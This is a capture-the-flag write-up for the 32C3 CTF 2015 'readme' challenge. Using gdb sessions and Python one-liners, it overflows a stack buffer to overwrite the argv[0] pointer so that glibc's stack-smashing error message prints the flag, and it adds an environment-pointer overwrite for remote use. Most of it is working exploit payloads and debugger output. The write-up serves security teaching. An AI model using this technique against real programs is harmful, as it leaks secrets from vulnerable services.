# PWN 200 Readme

```
# BP on the first instruction in main()
=> 0x4006d0:    sub    rsp,0x8
   0x4006d4:    mov    rdi,QWORD PTR [rip+0x200665]        # 0x600d40 <stdout>
   0x4006db:    xor    esi,esi
   0x4006dd:    call   0x400660 <setbuf@plt>
   0x4006e2:    call   0x4007e0
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe268 --> 0x7ffff7a5c2b1 (<__libc_start_main+241>:       mov    edi,eax)
0008| 0x7fffffffe270 --> 0x0
0016| 0x7fffffffe278 --> 0x7fffffffe348 --> 0x7fffffffe5b6 ("/root/readme-ctf/readme.bin")
0024| 0x7fffffffe280 --> 0x1f7b9d1a8
0032| 0x7fffffffe288 --> 0x4006d0 (sub    rsp,0x8)
0040| 0x7fffffffe290 --> 0x0
0048| 0x7fffffffe298 --> 0x4ee5d28ad1b7091e
0056| 0x7fffffffe2a0 --> 0x4006ee (xor    ebp,ebp)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
```

As we can see, `0x7fffffffe348` points to the `argv[0]`.

```
gdb-peda$ x /2gx 0x7fffffffe340
0x7fffffffe340: 0x0000000000000001   0x00007fffffffe5b6 <= argc, argv[]
0x7fffffffe350: 0x0000000000000000   0x00007fffffffe5d2 <= \x00, env[0]
0x7fffffffe360: 0x00007fffffffe5e5   0x00007fffffffe81a <= env[1], env[2]
0x7fffffffe370: 0x00007fffffffe831   0x00007fffffffe865
0x7fffffffe380: 0x00007fffffffe874   0x00007fffffffe885
0x7fffffffe390: 0x00007fffffffe892   0x00007fffffffe89d
0x7fffffffe3a0: 0x00007fffffffe8b0   0x00007fffffffe8ba
0x7fffffffe3b0: 0x00007fffffffe8cf   0x00007fffffffe8d8
0x7fffffffe3c0: 0x00007fffffffe8e9   0x00007fffffffe8f4
0x7fffffffe3d0: 0x00007fffffffe8fd   0x00007fffffffe90c
0x7fffffffe3e0: 0x00007fffffffe92d   0x00007fffffffe949
0x7fffffffe3f0: 0x00007fffffffe95c   0x00007fffffffe968
0x7fffffffe400: 0x00007fffffffe97c   0x00007fffffffe990
0x7fffffffe410: 0x00007fffffffe9a0   0x00007fffffffe9a8
0x7fffffffe420: 0x00007fffffffe9ba   0x00007fffffffe9c7
0x7fffffffe430: 0x00007fffffffe9fa   0x00007fffffffea16
0x7fffffffe440: 0x00007fffffffea6c   0x00007fffffffea7b
0x7fffffffe450: 0x00007fffffffea8e   0x0000000000000000 <= .., \x00

# argv[0]
gdb-peda$ x /s 0x00007fffffffe5b6
0x7fffffffe5b6: "/root/readme-ctf/readme.bin"
```

We compute how much bytes we need to overwrite till we reach `argv[0]` address.

```
gdb-peda$ r <<< $(python -c 'print "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B" + "\n" + "1\n" ')

=> 0x40088a:    xor    rax,QWORD PTR fs:0x28
   0x400893:    jne    0x4008a9
   0x400895:    add    rsp,0x118
   0x40089c:    pop    rbx
   0x40089d:    pop    rbp
   
gdb-peda$ x /xg 0x7fffffffe348
0x7fffffffe348: 0x4130734139724138
```

```
$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x4130734139724138
[*] Exact match at offset 536
```

Here the `argv[0]` is still printed.

```
$ python -c 'from struct import pack; print "A" * 535  + "\n" + "1\n" ' | ./readme.bin
Hello!
What's your name? Nice to meet you, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.
Please overwrite the flag: Thank you, bye!
*** stack smashing detected ***: ./readme.bin terminated
======= Backtrace: =========
/lib/x86_64-linux-gnu/libc.so.6(+0x70bcb)[0x7ffff7aacbcb]
/lib/x86_64-linux-gnu/libc.so.6(__fortify_fail+0x37)[0x7ffff7b350e7]
/lib/x86_64-linux-gnu/libc.so.6(__fortify_fail+0x0)[0x7ffff7b350b0]
./readme.bin[0x4008ae]
======= Memory map: ========
00400000-00401000 r-xp 00000000 08:01 2382457                            /root/readme-ctf/readme.bin
00600000-00601000 rw-p 00000000 08:01 2382457                            /root/readme-ctf/readme.bin
00601000-00623000 rw-p 00000000 00:00 0                                  [heap]
7ffff7825000-7ffff783b000 r-xp 00000000 08:01 1055998                    /lib/x86_64-linux-gnu/libgcc_s.so.1
7ffff783b000-7ffff7a3a000 ---p 00016000 08:01 1055998                    /lib/x86_64-linux-gnu/libgcc_s.so.1
7ffff7a3a000-7ffff7a3b000 r--p 00015000 08:01 1055998                    /lib/x86_64-linux-gnu/libgcc_s.so.1
7ffff7a3b000-7ffff7a3c000 rw-p 00016000 08:01 1055998                    /lib/x86_64-linux-gnu/libgcc_s.so.1
7ffff7a3c000-7ffff7bd1000 r-xp 00000000 08:01 1058687                    /lib/x86_64-linux-gnu/libc-2.24.so
7ffff7bd1000-7ffff7dd0000 ---p 00195000 08:01 1058687                    /lib/x86_64-linux-gnu/libc-2.24.so
7ffff7dd0000-7ffff7dd4000 r--p 00194000 08:01 1058687                    /lib/x86_64-linux-gnu/libc-2.24.so
7ffff7dd4000-7ffff7dd6000 rw-p 00198000 08:01 1058687                    /lib/x86_64-linux-gnu/libc-2.24.so
7ffff7dd6000-7ffff7dda000 rw-p 00000000 00:00 0
7ffff7dda000-7ffff7dfd000 r-xp 00000000 08:01 1048797                    /lib/x86_64-linux-gnu/ld-2.24.so
7ffff7fcc000-7ffff7fce000 rw-p 00000000 00:00 0
7ffff7ff4000-7ffff7ff8000 rw-p 00000000 00:00 0
7ffff7ff8000-7ffff7ffa000 r--p 00000000 00:00 0                          [vvar]
7ffff7ffa000-7ffff7ffc000 r-xp 00000000 00:00 0                          [vdso]
7ffff7ffc000-7ffff7ffd000 r--p 00022000 08:01 1048797                    /lib/x86_64-linux-gnu/ld-2.24.so
7ffff7ffd000-7ffff7ffe000 rw-p 00023000 08:01 1048797                    /lib/x86_64-linux-gnu/ld-2.24.so
7ffff7ffe000-7ffff7fff000 rw-p 00000000 00:00 0
7ffffffde000-7ffffffff000 rw-p 00000000 00:00 0                          [stack]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
Aborted
```

Corrupted `argv[0]` pointer:

```
root@kali64:~/readme-ctf$ python -c 'from struct import pack; print "A" * 536  + "\n" + "1\n" ' | ./readme.bin
Hello!
What's your name? Nice to meet you, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.
Please overwrite the flag: Thank you, bye!
*** stack smashing detected ***:  terminated
======= Backtrace: =========
/lib/x86_64-linux-gnu/libc.so.6(+0x70bcb)[0x7ffff7aacbcb]
/lib/x86_64-linux-gnu/libc.so.6(__fortify_fail+0x37)[0x7ffff7b350e7]
/lib/x86_64-linux-gnu/libc.so.6(__fortify_fail+0x0)[0x7ffff7b350b0]
[0x4008ae]
======= Memory map: ========
00400000-00401000 r-xp 00000000 08:01 2382457                            /root/readme-ctf/readme.bin
00600000-00601000 rw-p 00000000 08:01 2382457                            /root/readme-ctf/readme.bin
00601000-00623000 rw-p 00000000 00:00 0                                  [heap]
7ffff7825000-7ffff783b000 r-xp 00000000 08:01 1055998                    /lib/x86_64-linux-gnu/libgcc_s.so.1
7ffff783b000-7ffff7a3a000 ---p 00016000 08:01 1055998                    /lib/x86_64-linux-gnu/libgcc_s.so.1
7ffff7a3a000-7ffff7a3b000 r--p 00015000 08:01 1055998                    /lib/x86_64-linux-gnu/libgcc_s.so.1
7ffff7a3b000-7ffff7a3c000 rw-p 00016000 08:01 1055998                    /lib/x86_64-linux-gnu/libgcc_s.so.1
7ffff7a3c000-7ffff7bd1000 r-xp 00000000 08:01 1058687                    /lib/x86_64-linux-gnu/libc-2.24.so
7ffff7bd1000-7ffff7dd0000 ---p 00195000 08:01 1058687                    /lib/x86_64-linux-gnu/libc-2.24.so
7ffff7dd0000-7ffff7dd4000 r--p 00194000 08:01 1058687                    /lib/x86_64-linux-gnu/libc-2.24.so
7ffff7dd4000-7ffff7dd6000 rw-p 00198000 08:01 1058687                    /lib/x86_64-linux-gnu/libc-2.24.so
7ffff7dd6000-7ffff7dda000 rw-p 00000000 00:00 0
7ffff7dda000-7ffff7dfd000 r-xp 00000000 08:01 1048797                    /lib/x86_64-linux-gnu/ld-2.24.so
7ffff7fcc000-7ffff7fce000 rw-p 00000000 00:00 0
7ffff7ff4000-7ffff7ff8000 rw-p 00000000 00:00 0
7ffff7ff8000-7ffff7ffa000 r--p 00000000 00:00 0                          [vvar]
7ffff7ffa000-7ffff7ffc000 r-xp 00000000 00:00 0                          [vdso]
7ffff7ffc000-7ffff7ffd000 r--p 00022000 08:01 1048797                    /lib/x86_64-linux-gnu/ld-2.24.so
7ffff7ffd000-7ffff7ffe000 rw-p 00023000 08:01 1048797                    /lib/x86_64-linux-gnu/ld-2.24.so
7ffff7ffe000-7ffff7fff000 rw-p 00000000 00:00 0
7ffffffde000-7ffffffff000 rw-p 00000000 00:00 0                          [stack]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
Aborted
```

We inject the pointer to the flag memory location instead of `argv[0]`. 

```
gdb-peda$ searchmem 32C3
Searching for '32C3' in: None ranges
Found 1 results, display max 1 items:
readme.bin : 0x400d20 ("32C3_TheServerHasTheFlagHere...")

gdb-peda$ r <<< $(python -c 'from struct import pack; print "A" * 536 + pack("<Q", 0x400d20) + "\n" + "1\n" ')

=> 0x40088a:    xor    rax,QWORD PTR fs:0x28

gdb-peda$ x /xw 0x7fffffffe348
0x7fffffffe348: 0x00400d20
```

```
$ python -c 'from pwn import *; print "A" * 536 + p64(0x400d20) + "1\n"' | ./readme.bin
Hello!
What's your name? Nice to meet you, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@.AAA
Please overwrite the flag: Thank you, bye!
*** stack smashing detected ***: 32C3_TheServerHasTheFlagHere... terminated
======= Backtrace: =========
/lib/x86_64-linux-gnu/libc.so.6(+0x70bcb)[0x7ffff7aacbcb]
/lib/x86_64-linux-gnu/libc.so.6(__fortify_fail+0x37)[0x7ffff7b350e7]
/lib/x86_64-linux-gnu/libc.so.6(__fortify_fail+0x0)[0x7ffff7b350b0]
32C3_TheServerHasTheFlagHere...[0x4008ae]
======= Memory map: ========
00400000-00401000 r-xp 00000000 08:01 2382457                            /root/readme-ctf/readme.bin
00600000-00601000 rw-p 00000000 08:01 2382457                            /root/readme-ctf/readme.bin
00601000-00623000 rw-p 00000000 00:00 0                                  [heap]
7ffff7825000-7ffff783b000 r-xp 00000000 08:01 1055998                    /lib/x86_64-linux-gnu/libgcc_s.so.1
7ffff783b000-7ffff7a3a000 ---p 00016000 08:01 1055998                    /lib/x86_64-linux-gnu/libgcc_s.so.1
7ffff7a3a000-7ffff7a3b000 r--p 00015000 08:01 1055998                    /lib/x86_64-linux-gnu/libgcc_s.so.1
7ffff7a3b000-7ffff7a3c000 rw-p 00016000 08:01 1055998                    /lib/x86_64-linux-gnu/libgcc_s.so.1
7ffff7a3c000-7ffff7bd1000 r-xp 00000000 08:01 1058687                    /lib/x86_64-linux-gnu/libc-2.24.so
7ffff7bd1000-7ffff7dd0000 ---p 00195000 08:01 1058687                    /lib/x86_64-linux-gnu/libc-2.24.so
7ffff7dd0000-7ffff7dd4000 r--p 00194000 08:01 1058687                    /lib/x86_64-linux-gnu/libc-2.24.so
7ffff7dd4000-7ffff7dd6000 rw-p 00198000 08:01 1058687                    /lib/x86_64-linux-gnu/libc-2.24.so
7ffff7dd6000-7ffff7dda000 rw-p 00000000 00:00 0
7ffff7dda000-7ffff7dfd000 r-xp 00000000 08:01 1048797                    /lib/x86_64-linux-gnu/ld-2.24.so
7ffff7fcc000-7ffff7fce000 rw-p 00000000 00:00 0
7ffff7ff4000-7ffff7ff8000 rw-p 00000000 00:00 0
7ffff7ff8000-7ffff7ffa000 r--p 00000000 00:00 0                          [vvar]
7ffff7ffa000-7ffff7ffc000 r-xp 00000000 00:00 0                          [vdso]
7ffff7ffc000-7ffff7ffd000 r--p 00022000 08:01 1048797                    /lib/x86_64-linux-gnu/ld-2.24.so
7ffff7ffd000-7ffff7ffe000 rw-p 00023000 08:01 1048797                    /lib/x86_64-linux-gnu/ld-2.24.so
7ffff7ffe000-7ffff7fff000 rw-p 00000000 00:00 0
7ffffffde000-7ffffffff000 rw-p 00000000 00:00 0                          [stack]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
Aborted
```

Because we are working with socket / pipe, we overwrite also the `env` address with our pointer. Note that this code does not work in gdb, because `\x00` terminates strings, so better approach would be to debug only using core dumps. `0x600d20` is the address of the second buffer, which is used when asking to overwrite the flag.

```
$ python -c 'from pwn import *; print "A" * 536 + p64(0x400d20) + p64(0) + p64(0x600d20) + "\n" + "LIBC_FATAL_STDERR_=1\n" ' | ./readme.bin
Hello!
What's your name? Nice to meet you, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@.AAA
Please overwrite the flag: Thank you, bye!
*** stack smashing detected ***: 32C3_TheServerHasTheFlagHere... terminated
======= Backtrace: =========
/lib/x86_64-linux-gnu/libc.so.6(+0x70bcb)[0x7ffff7aacbcb]
/lib/x86_64-linux-gnu/libc.so.6(__fortify_fail+0x37)[0x7ffff7b350e7]
/lib/x86_64-linux-gnu/libc.so.6(__fortify_fail+0x0)[0x7ffff7b350b0]
32C3_TheServerHasTheFlagHere...[0x4008ae]
======= Memory map: ========
00400000-00401000 r-xp 00000000 08:01 2382457                            /root/readme-ctf/readme.bin
00600000-00601000 rw-p 00000000 08:01 2382457                            /root/readme-ctf/readme.bin
00601000-00623000 rw-p 00000000 00:00 0                                  [heap]
7ffff7825000-7ffff783b000 r-xp 00000000 08:01 1055998                    /lib/x86_64-linux-gnu/libgcc_s.so.1
7ffff783b000-7ffff7a3a000 ---p 00016000 08:01 1055998                    /lib/x86_64-linux-gnu/libgcc_s.so.1
7ffff7a3a000-7ffff7a3b000 r--p 00015000 08:01 1055998                    /lib/x86_64-linux-gnu/libgcc_s.so.1
7ffff7a3b000-7ffff7a3c000 rw-p 00016000 08:01 1055998                    /lib/x86_64-linux-gnu/libgcc_s.so.1
7ffff7a3c000-7ffff7bd1000 r-xp 00000000 08:01 1058687                    /lib/x86_64-linux-gnu/libc-2.24.so
7ffff7bd1000-7ffff7dd0000 ---p 00195000 08:01 1058687                    /lib/x86_64-linux-gnu/libc-2.24.so
7ffff7dd0000-7ffff7dd4000 r--p 00194000 08:01 1058687                    /lib/x86_64-linux-gnu/libc-2.24.so
7ffff7dd4000-7ffff7dd6000 rw-p 00198000 08:01 1058687                    /lib/x86_64-linux-gnu/libc-2.24.so
7ffff7dd6000-7ffff7dda000 rw-p 00000000 00:00 0
7ffff7dda000-7ffff7dfd000 r-xp 00000000 08:01 1048797                    /lib/x86_64-linux-gnu/ld-2.24.so
7ffff7fcc000-7ffff7fce000 rw-p 00000000 00:00 0
7ffff7ff4000-7ffff7ff8000 rw-p 00000000 00:00 0
7ffff7ff8000-7ffff7ffa000 r--p 00000000 00:00 0                          [vvar]
7ffff7ffa000-7ffff7ffc000 r-xp 00000000 00:00 0                          [vdso]
7ffff7ffc000-7ffff7ffd000 r--p 00022000 08:01 1048797                    /lib/x86_64-linux-gnu/ld-2.24.so
7ffff7ffd000-7ffff7ffe000 rw-p 00023000 08:01 1048797                    /lib/x86_64-linux-gnu/ld-2.24.so
7ffff7ffe000-7ffff7fff000 rw-p 00000000 00:00 0
7ffffffde000-7ffffffff000 rw-p 00000000 00:00 0                          [stack]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
Aborted
```

References: 

[https://www.win.tue.nl/~aeb/linux/hh/stack-layout.html](https://www.win.tue.nl/~aeb/linux/hh/stack-layout.html)

[32C3 CTF 2015 : readme](https://github.com/ctfs/write-ups-2015/tree/master/32c3-ctf-2015/pwn/readme-200)
